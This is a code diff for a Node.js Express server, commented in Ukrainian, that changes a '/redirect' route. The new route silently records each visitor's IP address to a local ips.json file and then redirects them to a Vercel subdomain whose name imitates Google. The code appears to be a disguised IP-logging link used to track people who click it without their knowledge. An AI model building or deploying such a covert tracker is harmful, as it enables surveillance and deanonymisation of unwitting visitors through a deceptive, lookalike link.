@@ -88,7 +88,42 @@ app.get('/get-ip', async (req, res) => {
 
 // Перенаправлення на ваше нове посилання на Vercel
 app.get('/redirect', (req, res) => {
-  res.redirect('https://google-d77t.vercel.app/'); // Нове посилання на Vercel
+  const realIp = getIpFromHeaders(req); // Отримуємо IP навіть при перенаправленні
+  console.log(`IP при редіректі: ${realIp}`);
+
+  // Записуємо IP у файл перед перенаправленням
+  fs.readFile(filePath, 'utf8', (err, data) => {
+    let ips = [];
+    if (err) {
+      if (err.code === 'ENOENT') {
+        console.log('Файл ips.json не знайдено. Створюється новий файл.');
+        ips = [];
+      } else {
+        console.error('Помилка при читанні файлу:', err);
+        return res.status(500).send('Помилка при читанні файлу IP');
+      }
+    } else {
+      try {
+        ips = JSON.parse(data);
+      } catch (parseErr) {
+        console.error('Помилка парсингу файлу:', parseErr);
+        return res.status(500).send('Помилка парсингу файлу IP');
+      }
+    }
+
+    // Додавання IP у масив
+    ips.push(realIp);
+
+    // Запис оновленого масиву в файл ips.json
+    fs.writeFile(filePath, JSON.stringify(ips, null, 2), (writeErr) => {
+      if (writeErr) {
+        console.error('Помилка запису у файл:', writeErr);
+        return res.status(500).send('Помилка при збереженні IP');
+      }
+      // Перенаправляємо на нове посилання
+      res.redirect('https://google-xi-ashy.vercel.app/');
+    });
+  });
 });
 
 // Запуск сервера
